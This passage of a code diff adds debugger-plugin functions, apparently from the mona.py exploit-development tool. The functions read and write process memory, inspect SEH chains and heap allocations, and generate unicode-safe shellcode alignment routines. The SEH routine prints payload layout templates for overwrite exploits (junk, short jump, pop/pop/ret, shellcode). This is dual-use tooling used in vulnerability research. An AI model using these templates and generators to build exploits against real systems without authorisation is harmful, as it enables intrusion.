+			regs = dbg.getRegs()
+			stringtowrite = ""
+			# read or write ?
+			if not "r" in args and not "w" in args:
+				dbg.log("*** Error: you must indicate if you want to read (-r) or write (-w) ***",highlight=True)
+				return
+			addresserror = False
+			if not "a" in args:
+				addresserror = True
+			else:
+				if type(args["a"]).__name__.lower() != "bool":
+					# check if it's a register or not
+					if str(args["a"]).upper() in regs:
+						addy = regs[str(args["a"].upper())]
+					else:
+						addy = int(args["a"],16)
+				else:
+					addresserror = True
+
+			if addresserror:
+				dbg.log("*** Error: you must specify a valid address with -a ***",highlight=True)
+				return
+
+			if "w" in args:
+				mode = "write"
+			if "r" in args:
+				# read wins, because it's non destructive
+				mode = "read"
+			if "u" in args:
+				useunicode = True
+
+			stringerror = False
+			if "w" in args and not "s" in args:
+				stringerror = True
+			if "s" in args:
+				if type(args["s"]).__name__.lower() != "bool":
+					stringtowrite = args["s"]
+				else:
+					stringerror = True
+
+			if "noterminate" in args:
+				terminatestring = False
+
+			if stringerror:
+				dbg.log("*** Error: you must specify a valid string with -s ***",highlight=True)
+				return
+
+			if mode == "read":
+				stringinmemory = ""
+				extra = " "
+				try:
+					if not useunicode:
+						stringinmemory = dbg.readString(addy)
+					else:
+						stringinmemory = dbg.readWString(addy)
+						extra = " (unicode) "
+					dbg.log("String%sat 0x%08x:" % (extra,addy))
+					dbg.log("%s" % stringinmemory)
+				except:
+					dbg.log("Unable to read string at 0x%08x" % addy)
+			if mode == "write":
+				origstring = stringtowrite
+				writtendata = ""
+				try:
+					if not useunicode:
+						if terminatestring:
+							stringtowrite += "\x00"
+						byteswritten = ""
+						for c in stringtowrite:
+							byteswritten += " %s" % bin2hex(c)
+						dbg.writeMemory(addy,stringtowrite)
+						writtendata = dbg.readString(addy)
+						dbg.log("Wrote string (%d bytes) to 0x%08x:" % (len(stringtowrite),addy))
+						dbg.log("%s" % byteswritten)
+					else:
+						newstring = ""
+						for c in stringtowrite:
+							newstring += "%s%s" % (c,"\x00")
+						if terminatestring:
+							newstring += "\x00\x00"
+						dbg.writeMemory(addy,newstring)
+						dbg.log("Wrote unicode string (%d bytes) to 0x%08x" % (len(newstring),addy))
+						writtendata = dbg.readWString(addy)
+						byteswritten = ""
+						for c in newstring:
+							byteswritten += " %s" % bin2hex(c)
+						dbg.log("%s" % byteswritten)
+					if not writtendata.startswith(origstring):
+						dbg.log("Write operation succeeded, but the string in memory doesn't appear to be there",highlight=True)
+				except:
+					dbg.log("Unable to write the string to 0x%08x" % addy)	
+					dbg.logLines(traceback.format_exc(),highlight=True)			
+			return
+
+
+		def procKb(args):
+			validcommands = ['set','list','del']
+			validcommandfound = False
+			selectedcommand = ""
+			selectedid = ""
+			selectedvalue = ""
+			for command in validcommands:
+				if command in args:
+					validcommandfound = True
+					selectedcommand = command
+					break
+			dbg.log("")
+			if not validcommandfound:
+				dbg.log("*** Please specify a valid command. Valid commands are :")
+				for command in validcommands:
+					dbg.log("    -%s" % command)
+				return
+
+			if "id" in args:
+				if type(args["id"]).__name__.lower() != "bool":
+					selectedid = args["id"]
+
+			if "value" in args:
+				if type(args["value"]).__name__.lower() != "bool":
+					selectedvalue = args["value"]
+
+			dbg.log("Knowledgebase database : %s" % dbg.getKBDB())
+			kb = dbg.listKnowledge()
+			if selectedcommand == "list":
+				dbg.log("Number of IDs in Knowledgebase : %d" % len(kb))
+				if len(kb) > 0:
+					if selectedid == "":
+						dbg.log("IDs :")
+						dbg.log("-----")
+						for kbid in kb:
+							dbg.log(kbid)
+					else:
+						if selectedid in kb:
+							kbid = dbg.getKnowledge(selectedid)
+							kbtype = kbid.__class__.__name__
+							kbtitle = "Entries for ID %s (type %s) :" % (selectedid,kbtype)
+							dbg.log(kbtitle)
+							dbg.log("-" * (len(kbtitle)+2))
+							if selectedvalue != "":
+								dbg.log("  (Filter : %s)" % selectedvalue)
+							nrentries = 0
+							if kbtype == "dict":
+								for dictkey in kbid:
+									if selectedvalue == "" or selectedvalue in dictkey:
+										logline = ""
+										if kbid[dictkey].__class__.__name__ == "int" or kb[dictkey].__class__.__name__ == "long":
+											logline = "  %s : %d (0x%x)" % (str(dictkey),kbid[dictkey],kbid[dictkey])
+										else:
+											logline = "  %s : %s" % (str(dictkey),kbid[dictkey])
+										dbg.log(logline)
+										nrentries += 1
+							if kbtype == "list":
+								cnt = 0
+								for entry in kbid:
+									dbg.log("  %d : %s" % (cnt,kbid[entry]))
+									cnt += 1
+									nrentries += 1
+							if kbtype == "str":
+								dbg.log("  %s" % kbid)
+								nrentries += 1
+							if kbtype == "int" or kbtype == "long":
+								dbg.log("  %d (0x%08x)" % (kbid,kbid))
+								nrentries += 1
+
+							dbg.log("")
+							filtertxt = ""
+							if selectedvalue != "":
+								filtertxt="filtered "
+							dbg.log("Number of %sentries for ID %s : %d" % (filtertxt,selectedid,nrentries))
+						else:
+							dbg.log("ID %s was not found in the Knowledgebase" % selectedid)
+
+			if selectedcommand == "set":
+				# we need an ID and a value argument
+				if selectedid == "":
+					dbg.log("*** Please enter a valid ID with -id",highlight=1)
+					return
+				if selectedvalue == "":
+					dbg.log("*** Please enter a valid value",highlight=1)
+					return
+				if selectedid in kb:
+					# vtableCache
+					if selectedid == "vtableCache":
+						# split on command
+						valueparts = selectedvalue.split(",")
+						if len(valueparts) == 2:
+							vtablename = valueparts[0].strip(" ")
+							vtablevalue = 0
+							if "0x" in valueparts[1].lower():
+								vtablevalue = int(valueparts[1],16)
+							else:
+								vtablevalue = int(valueparts[1])
+							kbadd = {}
+							kbadd[vtablename] = vtablevalue
+							dbg.addKnowledge(selectedid,kbadd)
+						else:
+							dbg.log("*** Please provide a valid value for -value")
+							dbg.log("*** KB %s contains a list, please use a comma")
+							dbg.log("*** to separate entries. First entry should be a string,")
+							dbg.log("*** Second entry should be an integer.")
+							return
+					else:
+						dbg.addKnowledge(selectedid,selectedvalue)
+					dbg.log(" ")
+					dbg.log("ID %s updated." % selectedid)
+				else:
+					dbg.log("ID %s was not found in the Knowledgebase" % selectedid)
+
+			if selectedcommand == "del":
+				if selectedid == "" or selectedid not in kb:
+					dbg.log("*** Please enter a valid ID with -id",highlight=1)
+					return
+				else:
+					dbg.forgetKnowledge(selectedid,selectedvalue)
+				if selectedvalue == "":
+					dbg.log("*** Entire ID %s removed from Knowledgebase" % selectedid)
+				else:
+					dbg.log("*** Object %s in ID %s removed from Knowledgebase" % (selectedvalue,selectedid))
+			return
+
+		def procBPSeh(self):
+			sehchain = dbg.getSehChain()
+			dbg.log("Nr of SEH records : %d" % len(sehchain))
+			if len(sehchain) > 0:
+				dbg.log("SEH Chain :")
+				dbg.log("-----------")
+				dbg.log("Address     Next SEH    Handler")
+				for sehrecord in sehchain:
+					address = sehrecord[0]
+					sehandler = sehrecord[1]
+					nseh = ""
+					try:
+						nsehvalue = struct.unpack('<L',dbg.readMemory(address,4))[0]
+						nseh = "0x%08x" % nsehvalue
+					except:
+						nseh = "0x????????"
+					bpsuccess = True
+					try:
+						if __DEBUGGERAPP__ == "WinDBG":
+							bpsuccess = dbg.setBreakpoint(sehandler)
+						else:
+							dbg.setBreakpoint(sehandler)
+							bpsuccess = True
+					except:
+						bpsuccess = False
+					bptext = ""
+					if not bpsuccess:
+						bptext = "BP failed"
+					else:
+						bptext = "BP set"
+					ptr = MnPointer(sehandler)
+					funcinfo = ptr.getPtrFunction()
+					dbg.log("0x%08x  %s  0x%08x %s <- %s" % (address,nseh,sehandler,funcinfo,bptext))
+			dbg.log("")
+			return "Done"
+
+		def procSehChain(self):
+			sehchain = dbg.getSehChain()
+			dbg.log("Nr of SEH records : %d" % len(sehchain))
+			handlersoverwritten = {}
+			if len(sehchain) > 0:
+				dbg.log("Start of chain (TEB FS:[0]) : 0x%08x" % sehchain[0][0])
+				dbg.log("Address     Next SEH    Handler")
+				dbg.log("-------     --------    -------")
+				for sehrecord in sehchain:
+					recaddress = sehrecord[0]
+					sehandler = sehrecord[1]
+					nseh = ""
+					try:
+						nsehvalue = struct.unpack('<L',dbg.readMemory(recaddress,4))[0]
+						nseh = "0x%08x" % nsehvalue
+					except:
+						nseh = 0
+						sehandler = 0
+					overwritedata = checkSEHOverwrite(recaddress,nseh,sehandler)
+					overwritemark = ""
+					funcinfo = ""
+					if sehandler > 0:
+						ptr = MnPointer(sehandler)
+						funcinfo = ptr.getPtrFunction()
+					else:
+						funcinfo = " (corrupted record)"
+						if str(nseh).startswith("0x"):
+							nseh = "0x%08x" % int(nseh,16)
+						else:
+							nseh = "0x%08x" % int(nseh)
+					if len(overwritedata) > 0:
+						handlersoverwritten[recaddress] = overwritedata
+						smashoffset = int(overwritedata[1])
+						typeinfo = ""
+						if overwritedata[0] == "unicode":
+							smashoffset += 2
+							typeinfo = " [unicode]"
+						overwritemark = " (record smashed at offset %d%s)" % (smashoffset,typeinfo)
+						
+					dbg.log("0x%08x  %s  0x%08x %s%s" % (recaddress,nseh,sehandler,funcinfo, overwritemark), recaddress)
+			if len(handlersoverwritten) > 0:
+				dbg.log("")
+				dbg.log("Payload structure suggestion(s):")
+				for overwrittenhandler in handlersoverwritten:
+					overwrittendata = handlersoverwritten[overwrittenhandler]
+					overwrittentype = overwrittendata[0]
+					overwrittenoffset = int(overwrittendata[1])
+					if not overwrittentype == "unicode":
+						dbg.log("[Junk * %d]['\\xeb\\x06\\x41\\x41'][p/p/r][shellcode][more junk if needed]" % (overwrittenoffset))
+					else:
+						overwrittenoffset += 2
+						dbg.log("[Junk * %d][nseh - walkover][unicode p/p/r][venetian alignment][shellcode][more junk if needed]" % overwrittenoffset)
+			return
+
+
+		def procDumpLog(args):
+			logfile = ""
+			levels = 0
+			nestedsize = 0x28
+			filtersize = 0
+			ignorefree = False
+			
+			if "f" in args:
+				if type(args["f"]).__name__.lower() != "bool":
+					logfile = getAbsolutePath(args["f"])
+			
+			if "nofree" in args:
+				ignorefree = True			
+					
+
+			if "l" in args:
+				if type(args["l"]).__name__.lower() != "bool":
+					if str(args["l"]).lower().startswith("0x"):
+						try:
+							levels = int(args["l"],16)
+						except:
+							levels = 0
+					else:
+						try:
+							levels = int(args["l"])
+						except:
+							levels = 0
+
+			if "m" in args:
+				if type(args["m"]).__name__.lower() != "bool":
+					if str(args["m"]).lower().startswith("0x"):
+						try:
+							nestedsize = int(args["m"],16)
+						except:
+							nestedsize = 0x28
+					else:
+						try:
+							nestedsize = int(args["m"])
+						except:
+							nestedsize = 0x28
+
+			if "s" in args:
+				if type(args["s"]).__name__.lower() != "bool":
+					if str(args["s"]).lower().startswith("0x"):
+						try:
+							filtersize = int(args["s"],16)
+						except:
+							filtersize = 0
+					else:
+						try:
+							filtersize = int(args["s"])
+						except:
+							filtersize = 0
+
+			if logfile == "":
+				dbg.log(" *** Error: please specify a valid logfile with argument -f ***",highlight=1)
+				return
+
+			allocs = 0
+			frees = 0
+			# open logfile and record all objects & sizes
+			logdata = {}
+			try:
+				dbg.log("[+] Parsing logfile %s" % logfile)
+				f = open(logfile,"rb")
+				contents = f.readlines()
+				f.close()
+
+				for tline in contents:
+					line = str(tline)
+					if line.startswith("alloc("):
+						size = ""
+						addy = ""
+						lineparts = line.split("(")
+						if len(lineparts) > 1:
+							sizeparts = lineparts[1].split(")")
+							size = sizeparts[0].replace(" ","")
+						lineparts = line.split("=")
+						if len(lineparts) > 1:
+							linepartaddy = lineparts[1].split(" ")
+							for lpa in linepartaddy:
+								if addy != "":
+									break
+								if lpa != "":
+									addy = lpa 
+						if size != "" and addy != "":
+							size = size.lower()
+							addy = addy.lower()
+							if not addy in logdata:
+								if filtersize == 0:
+									logdata[addy] = size
+									allocs += 1
+								else:
+									try:
+										isize = int(size,16)
+										if isize == filtersize:
+											logdata[addy] = size
+											allocs += 1
+									except:
+										continue
+
+					if line.startswith("free(") and not ignorefree:
+						addy = ""
+						lineparts = line.split("(")
+						if len(lineparts) > 1:
+							addyparts = lineparts[1].split(")")
+							addy = addyparts[0].replace(" ","")
+						if addy != "":
+							addy = addy.lower()
+							if addy in logdata:
+								del logdata[addy]
+								frees += 1			
+
+				if ignorefree:
+					dbg.log("[+] Ignoring all free() events, showing all allocations")
+				dbg.log("[+] Logfile parsed, %d objects found" % len(logdata))
+				if filtersize > 0:
+					dbg.log("    Only showing alloc chunks of size 0x%08x" % filtersize)
+				dbg.log("    Total allocs: %d, total free: %d" % (allocs,frees))
+				dbg.log("[+] Dumping objects")
+				logfile = MnLog("dump_alloc_free.txt")
+				thislog = logfile.reset()
+				logfile.write("Addresses to dump:", thislog)
+				allocsizegroups = {}
+				allocsizes = []
+				heapgranularity = 8
+				for addy in logdata:
+					logfile.write("%s (%s)" % (addy, logdata[addy]), thislog)
+					allocsize = getHeapAllocSize(logdata[addy], heapgranularity)
+					if not allocsize in allocsizegroups:
+						allocsizegroups[allocsize] = [addy]
+					else:
+						allocsizegroups[allocsize].append(addy)
+					if not allocsize in allocsizes:
+						allocsizes.append(allocsize)
+				logfile.write("", thislog);
+				logfile.write("(Allocated) Size groups, heap granularity %d bytes" % heapgranularity, thislog)
+				allocsizes.sort()
+				for allocsize in allocsizes:
+					logfile.write("Size 0x%02x" % allocsize, thislog)
+					for allocsizeaddy in allocsizegroups[allocsize]:
+						logfile.write("  %s (%s)" % (allocsizeaddy, logdata[allocsizeaddy]), thislog)
+					
+				for addy in logdata:
+					asize = logdata[addy]
+					ptrx = MnPointer(int(addy,16))
+					size = int(asize,16)
+					dumpdata = ptrx.dumpObjectAtLocation(size,levels,nestedsize,thislog,logfile)
+					
+			except:
+				dbg.log(" *** Unable to open logfile %s ***" % logfile,highlight=1)
+				dbg.log(traceback.format_exc())
+				return
+
+
+			return
+
+
+		def procDumpObj(args):
+			addy = 0
+			levels = 0
+			size = 0
+			nestedsize = 0x28
+			regs = dbg.getRegs()
+			if "a" in args:
+				if type(args["a"]).__name__.lower() != "bool":
+					addy,addyok = getAddyArg(args["a"])
+
+			if "s" in args:
+				if type(args["s"]).__name__.lower() != "bool":
+					if str(args["s"]).lower().startswith("0x"):
+						try:
+							size = int(args["s"],16)
+						except:
+							size = 0
+					else:
+						try:
+							size = int(args["s"])
+						except:
+							size = 0
+
+			if "l" in args:
+				if type(args["l"]).__name__.lower() != "bool":
+					if str(args["l"]).lower().startswith("0x"):
+						try:
+							levels = int(args["l"],16)
+						except:
+							levels = 0
+					else:
+						try:
+							levels = int(args["l"])
+						except:
+							levels = 0
+
+			if "m" in args:
+				if type(args["m"]).__name__.lower() != "bool":
+					if str(args["m"]).lower().startswith("0x"):
+						try:
+							nestedsize = int(args["m"],16)
+						except:
+							nestedsize = 0
+					else:
+						try:
+							nestedsize = int(args["m"])
+						except:
+							nestedsize = 0
+
+			errorsfound = False
+			if addy == 0:
+				errorsfound = True
+				dbg.log("*** Please specify a valid address to argument -a ***",highlight=1)
+			else:
+				ptrx = MnPointer(addy)
+			osize = size
+			if size == 0:
+				# no size specified
+				if addy > 0:
+					dbg.log("[+] No size specified, checking if address is part of known heap chunk")
+					
+					if ptrx.isInHeap():
+						heapinfo = ptrx.getHeapInfo()
+						heapaddy = heapinfo[0]
+						chunkobj = heapinfo[3]
+						if not heapaddy == None:
+							if heapaddy > 0:
+								chunkaddy = chunkobj.chunkptr
+								size = chunkobj.usersize
+								dbg.log("    Address found in chunk 0x%08x, heap 0x%08x, (user)size 0x%02x" % (chunkaddy, heapaddy, size))
+								addy = chunkobj.userptr
+								if size > 0xfff:
+									dbg.log("    I'll only dump 0xfff bytes from the object, for performance reasons")
+									size = 0xfff
+			if size > 0xfff and osize > 0:
+				errorsfound = True
+				dbg.log("*** Please keep the size below 0xfff (argument -s) ***",highlight=1)
+			if size == 0:
+				size = 0x28
+			if levels > 0 and nestedsize == 0:
+				errorsfound = True
+				dbg.log("*** Please specify a valid size to argument -m ***",highlight=1)				
+
+			if not errorsfound:
+				ptrx = MnPointer(addy)
+				dumpdata = ptrx.dumpObjectAtLocation(size,levels,nestedsize)
+
+			return
+
+
+		# routine to copy bytes from one location to another
+		def procCopy(args):
+			src = 0
+			dst = 0
+			nrbytes = 0
+			regs = dbg.getRegs()
+			if "src" in args:
+				if type(args["src"]).__name__.lower() != "bool":
+					src,addyok = getAddyArg(args["src"])
+
+			if "dst" in args:
+				if type(args["dst"]).__name__.lower() != "bool":
+					dst,addyok = getAddyArg(args["dst"])
+
+			if "n" in args:
+				if type(args["n"]).__name__.lower() != "bool":
+					if "+" in str(args['n']) or "-" in str(args['n']):
+						nrbytes,bytesok = getAddyArg(args['n'])
+						if not bytesok:
+							errorsfound = True
+					else:
+						if str(args['n']).lower().startswith("0x"):
+							try:
+								nrbytes = int(args["n"],16)
+							except:
+								nrbytes = 0
+						else:
+							try:
+								nrbytes = int(args["n"])
+							except:
+								nrbytes = 0
+
+			errorsfound = False
+			if src == 0:
+				errorsfound = True
+				dbg.log("*** Please specify a valid source address to argument -src ***",highlight=1)
+			if dst == 0:
+				errorsfound = True
+				dbg.log("*** Please specify a valid destination address to argument -dst ***",highlight=1)
+			if nrbytes == 0:
+				errorsfound = True
+				dbg.log("*** Please specify a valid number of bytes to argument -n ***",highlight=1)
+
+			if not errorsfound:
+				dbg.log("[+] Attempting to copy 0x%08x bytes from 0x%08x to 0x%08x" % (nrbytes, src, dst))
+				sourcebytes = dbg.readMemory(src,nrbytes)
+				try:
+					dbg.writeMemory(dst,sourcebytes)
+					dbg.log("    Done.")
+				except:
+					dbg.log("    *** Copy failed, check if both locations are accessible/mapped",highlight=1)
+
+			return
+
+
+
+		# unicode alignment routines written by floyd (http://www.floyd.ch, twitter: @floyd_ch)
+		def procUnicodeAlign(args):
+			leaks = False
+			address = 0
+			alignresults = {}
+			bufferRegister = "eax" #we will put ebp into the buffer register
+			timeToRun = 15
+			registers = {"eax":0, "ebx":0, "ecx":0, "edx":0, "esp":0, "ebp":0,}
+			showerror = False
+			regs = dbg.getRegs()
+
+			if "l" in args:
+				leaks = True
+
+			if "a" in args:
+				if type(args["a"]).__name__.lower() != "bool":
+					address,addyok = getAddyArg(args["a"])
+			else:
+				address = regs["EIP"]
+				if leaks:
+					address += 1
+
+			if address == 0:
+				dbg.log("Please enter a valid address with argument -a",highlight=1)
+				dbg.log("This address must be the location where the alignment code will be placed/start")
+				dbg.log("(without leaking zero byte). Don't worry, the script will only use")
+				dbg.log("it to calculate the offset from the address to EBP.")
+				showerror=True
+
+			if "b" in args:
+				if args["b"].lower().strip() == "eax":
+					bufferRegister = 'eax'
+				elif args["b"].lower().strip() == "ebx":
+					bufferRegister = 'ebx'
+				elif args["b"].lower().strip() == "ecx":
+					bufferRegister = 'ecx'
+				elif args["b"].lower().strip() == "edx":
+					bufferRegister = 'edx'
+				else:
+					dbg.log("Please enter a valid register with argument -b")
+					dbg.log("Valid registers are: eax, ebx, ecx, edx")
+					showerror = True
+
+			if "t" in args and args["t"] != "":
+				try:
+					timeToRun = int(args["t"])
+					if timeToRun < 0:
+						timeToRun = timeToRun * (-1)
+				except:
+					dbg.log("Please enter a valid integer for -t",highlight=1)
+					showerror=True
+			if "ebp" in args and args["ebp"] != "":
+				try:
+					registers["ebp"] = int(args["ebp"],16)
+				except:
+					dbg.log("Please enter a valid value for ebp",highlight=1)
+					showerror=True
+
+			dbg.log("[+] Start address for venetian alignment routine: 0x%08x" % address)
+			dbg.log("[+] Will prepend alignment with null byte compensation? %s" % str(leaks).lower())
+			# ebp must be writeable for this routine to work
+			value_of_ebp = regs["EBP"]
+			dbg.log("[+] Checking if ebp (0x%08x) is writeable" % value_of_ebp)
+			ebpaccess = getPointerAccess(value_of_ebp)
+			if not "WRITE" in ebpaccess:
+				dbg.log("[!] Warning! ebp does not appear to be writeable!",highlight = 1)
+				dbg.log("    You will have to run some custom instructions first to make ebp writeable")
+				dbg.log("    and at that point, run this mona command again.")
+				dbg.log("    Hints: maybe you can pop something off the stack into ebp,")
+				dbg.log("    or push esp and pop it into ebp.")
+				showerror = True
+			else:
+				dbg.log("    OK (%s)" % ebpaccess)
+			if not showerror:
+
+				alignresults = prepareAlignment(leaks, address, bufferRegister, timeToRun, registers)
+				# write results to file
+				if len(alignresults) > 0:
+					if not silent:
+						dbg.log("[+] Alignment generator finished, %d results" % len(alignresults))
+						logfile = MnLog("venetian_alignment.txt")
+						thislog = logfile.reset()
+						for resultnr in alignresults:
+							resulttitle = "Alignment routine %d:" % resultnr
+							logfile.write(resulttitle,thislog)
+							logfile.write("-" * len(resulttitle),thislog)
+							theseresults = alignresults[resultnr]
+							for resultinstructions in theseresults:
+								logfile.write("Instructions:",thislog)
+								resultlines = resultinstructions.split(";")
+								for resultline in resultlines:
+									logfile.write("   %s" % resultline.strip(),thislog)
+								logfile.write("Hex:",thislog)
+								logfile.write("'%s'" % theseresults[resultinstructions],thislog)
+							logfile.write("",thislog)
+			return alignresults
+
+
+		def prepareAlignment(leaks, address, bufferRegister, timeToRun, registers):
+
+			def getRegister(registerName):
+				registerName = registerName.upper()
+				regs = dbg.getRegs()
+				if registerName in regs:
+					return regs[registerName]
+
+			def calculateNewXregister(x,h,l):
+				return ((x>>16)<<16)+(h<<8)+l
+
+			prefix = ""
+			postfix = ""
+			additionalLength = 0 #Length of the prefix+postfix instructions in after-unicode-conversion bytes
+			code_to_get_rid_of_zeros = "add [ebp],ch; " #\x6d --> \x00\x6d\x00
+
+			buf_sig = bufferRegister[1]
+			
+			registers_to_fill = ["ah", "al", "bh", "bl", "ch", "cl", "dh", "dl"] #important: h's first!
+			registers_to_fill.remove(buf_sig+"h")
+			registers_to_fill.remove(buf_sig+"l")
+			
+			leadingZero = leaks
+
+			for name in registers:
+				if not registers[name]:
+					registers[name] = getRegister(name)
+
+			#256 values with only 8276 instructions (bruteforced), best found so far:
+			#values_to_generate_all_255_values = [71, 87, 15, 251, 162, 185]
+			#but to be on the safe side, let's take only A-Za-z values (in 8669 instructions):
+			values_to_generate_all_255_values = [86, 85, 75, 109, 121, 99]
+			
+			new_values = zip(registers_to_fill, values_to_generate_all_255_values)
+			
+			if leadingZero:
+				prefix += code_to_get_rid_of_zeros
+				additionalLength += 2
+				leadingZero = False
+			#prefix += "mov bl,0; mov bh,0; mov cl,0; mov ch,0; mov dl,0; mov dh,0; "
+			#additionalLength += 12
+			for name, value in zip(registers_to_fill, values_to_generate_all_255_values):
+				padding = ""
+				if value < 16:
+					padding = "0"
+				if "h" in name:
+					prefix += "mov e%sx,0x4100%s%s00; " % (name[0], padding, hex(value)[2:])
+					prefix += "add [ebp],ch; "
+					additionalLength += 8
+				if "l" in name:
+					prefix += "mov e%sx,0x4100%s%s00; " % (buf_sig, padding, hex(value)[2:])
+					prefix += "add %s,%sh; " % (name, buf_sig)
+					prefix += "add [ebp],ch; "
+					additionalLength += 10
+			leadingZero = False
+			new_values_dict = dict(new_values)
+			for new in registers_to_fill[::2]:
+				n = new[0]
+				registers['e%sx'%n] = calculateNewXregister(registers['e%sx'%n], new_values_dict['%sh'%n], new_values_dict['%sl'%n])
+			
+			if leadingZero:
+				prefix += code_to_get_rid_of_zeros
+				additionalLength += 2
+				leadingZero = False
+			#Let's push the value of ebp into the BufferRegister
+			prefix += "push ebp; %spop %s; " % (code_to_get_rid_of_zeros, bufferRegister)
+			leadingZero = True
+			additionalLength += 6
+			registers[bufferRegister] = registers["ebp"]
+
+			if not leadingZero:
+				#We need a leading zero for the ADD operations
+				prefix += "push ebp; " #something 1 byte, doesn't matter what
+				leadingZero = True
+				additionalLength += 2
+						
+			#The last ADD command will leak another zero to the next instruction
+			#Therefore append (postfix) a last instruction to get rid of it
+			#so the shellcode is nicely aligned				
+			postfix += code_to_get_rid_of_zeros
+			additionalLength += 2
+			
+			alignresults = generateAlignment(address, bufferRegister, registers, timeToRun, prefix, postfix, additionalLength)
+
+			return alignresults
+
+
+		def generateAlignment(alignment_code_loc, bufferRegister, registers, timeToRun, prefix, postfix, additionalLength):
+
+			import copy, random, time
+
+			alignresults = {}
+
+			def sanitiseZeros(originals, names):
+				for index, i in enumerate(originals):
+					if i == 0:
+						warn("Your %s register is zero. That's bad for the heuristic." % names[index])
+						warn("In general this means there will be no result or they consist of more bytes.")
+
+			def checkDuplicates(originals, names):
+				duplicates = len(originals) - len(set(originals))
+				if duplicates > 0:
+					warn("""Some of the 2 byte registers seem to be the same. There is/are %i duplicate(s):""" % duplicates)
+					warn("In general this means there will be no result or they consist of more bytes.")
+					warn(", ".join(names))
+					warn(", ".join(hexlist(originals)))
+
+			def checkHigherByteBufferRegisterForOverflow(g1, name, g2):
+				overflowDanger = 0x100-g1
+				max_instructions = overflowDanger*256-g2
+				if overflowDanger <= 3:
+					warn("Your BufferRegister's %s register value starts pretty high (%s) and might overflow." % (name, hex(g1)))
+					warn("Therefore we only look for solutions with less than %i bytes (%s%s until overflow)." % (max_instructions, hex(g1), hex(g2)[2:]))
+					warn("This makes our search space smaller, meaning it's harder to find a solution.")
+				return max_instructions
+
+			def randomise(values, maxValues):
+				for index, i in enumerate(values):
+					if random.random() <= MAGIC_PROBABILITY_OF_ADDING_AN_ELEMENT_FROM_INPUTS:
+						values[index] += 1 
+						values[index] = values[index] % maxValues[index]
+
+			def check(as1, index_for_higher_byte, ss, gs, xs, ys, M, best_result):
+				g1, g2 = gs
+				s1, s2 = ss
+				sum_of_instructions = 2*sum(xs) + 2*sum(ys) + M
+				if best_result > sum_of_instructions:
+					res0 = s1
+					res1 = s2
+					for index, _ in enumerate(as1):
+						res0 += as1[index]*xs[index] % 256
+					res0 = res0 - ((g2+sum_of_instructions)/256)
+					as2 = copy.copy(as1)
+					as2[index_for_higher_byte] = (g1 + ((g2+sum_of_instructions)/256)) % 256
+					for index, _ in enumerate(as2):
+						res1 += as2[index]*ys[index] % 256
+					res1 = res1 - sum_of_instructions
+					if g1 == res0 % 256 and g2 == res1 % 256:
+						return sum_of_instructions
+				return 0
+			
+			def printNicely(names, buffer_registers_4_byte_names, xs, ys, additionalLength=0, prefix="", postfix=""):
+				
+				thisresult = {}
+
+				resulting_string = prefix
+				sum_bytes = 0
+				for index, x in enumerate(xs):
+					for k in range(0, x):
+						resulting_string += "add "+buffer_registers_4_byte_names[0]+","+names[index]+"; "
+						sum_bytes += 2
+				for index, y in enumerate(ys):
+					for k in range(y):
+						resulting_string += "add "+buffer_registers_4_byte_names[1]+","+names[index]+"; "
+						sum_bytes += 2
+				resulting_string += postfix
+				sum_bytes += additionalLength
+				if not silent:
+					info("[+] %i resulting bytes (%i bytes injection) of Unicode code alignment. Instructions:"%(sum_bytes,sum_bytes/2))
+					info("   ", resulting_string)
+				hex_string = metasm(resulting_string)
+				if not silent:
+					info("    Unicode safe opcodes without zero bytes:")
+					info("   ", hex_string)
+				thisresult[resulting_string] = hex_string
+				return thisresult
+
+
+			def metasm(inputInstr):
+				#the immunity and metasm assembly differ a lot:
+				#immunity add [ebp],ch "\x00\xad\x00\x00\x00\x00"
+				#metasm add [ebp],ch "\x00\x6d\x00" --> we want this!
+				#Therefore implementing our own "metasm" mapping here
+				#same problem for things like mov eax,0x41004300			     
+				ass_operation = {'add [ebp],ch': '\\x00\x6d\\x00', 'pop ebp': ']', 'pop edx': 'Z', 'pop ecx': 'Y', 'push ecx': 'Q',
+						 'pop ebx': '[', 'push ebx': 'S', 'pop eax': 'X', 'push eax': 'P', 'push esp': 'T', 'push ebp': 'U',
+						 'push edx': 'R', 'pop esp': '\\', 'add dl,bh': '\\x00\\xfa', 'add dl,dh': '\\x00\\xf2',
+						 'add dl,ah': '\\x00\\xe2', 'add ah,al': '\\x00\\xc4', 'add ah,ah': '\\x00\\xe4', 'add ch,bl': '\\x00\\xdd',
+						 'add ah,cl': '\\x00\\xcc', 'add bl,ah': '\\x00\\xe3', 'add bh,dh': '\\x00\\xf7', 'add bl,cl': '\\x00\\xcb',
+						 'add ah,ch': '\\x00\\xec', 'add bl,al': '\\x00\\xc3', 'add bh,dl': '\\x00\\xd7', 'add bl,ch': '\\x00\\xeb',
+						 'add dl,cl': '\\x00\\xca', 'add dl,bl': '\\x00\\xda', 'add al,ah': '\\x00\\xe0', 'add bh,ch': '\\x00\\xef',
+						 'add al,al': '\\x00\\xc0', 'add bh,cl': '\\x00\\xcf', 'add al,ch': '\\x00\\xe8', 'add dh,bl': '\\x00\\xde',
+						 'add ch,ch': '\\x00\\xed', 'add cl,dl': '\\x00\\xd1', 'add al,cl': '\\x00\\xc8', 'add dh,bh': '\\x00\\xfe',
+						 'add ch,cl': '\\x00\\xcd', 'add cl,dh': '\\x00\\xf1', 'add ch,ah': '\\x00\\xe5', 'add cl,bl': '\\x00\\xd9',
+						 'add dh,al': '\\x00\\xc6', 'add ch,al': '\\x00\\xc5', 'add cl,bh': '\\x00\\xf9', 'add dh,ah': '\\x00\\xe6',
+						 'add dl,dl': '\\x00\\xd2', 'add dh,cl': '\\x00\\xce', 'add dh,dl': '\\x00\\xd6', 'add ah,dh': '\\x00\\xf4',
+						 'add dh,dh': '\\x00\\xf6', 'add ah,dl': '\\x00\\xd4', 'add ah,bh': '\\x00\\xfc', 'add ah,bl': '\\x00\\xdc',
+						 'add bl,bh': '\\x00\\xfb', 'add bh,al': '\\x00\\xc7', 'add bl,dl': '\\x00\\xd3', 'add bl,bl': '\\x00\\xdb',
+						 'add bh,ah': '\\x00\\xe7', 'add bl,dh': '\\x00\\xf3', 'add bh,bl': '\\x00\\xdf', 'add al,bl': '\\x00\\xd8',
+						 'add bh,bh': '\\x00\\xff', 'add al,bh': '\\x00\\xf8', 'add al,dl': '\\x00\\xd0', 'add dl,ch': '\\x00\\xea',
+						 'add dl,al': '\\x00\\xc2', 'add al,dh': '\\x00\\xf0', 'add cl,cl': '\\x00\\xc9', 'add cl,ch': '\\x00\\xe9',
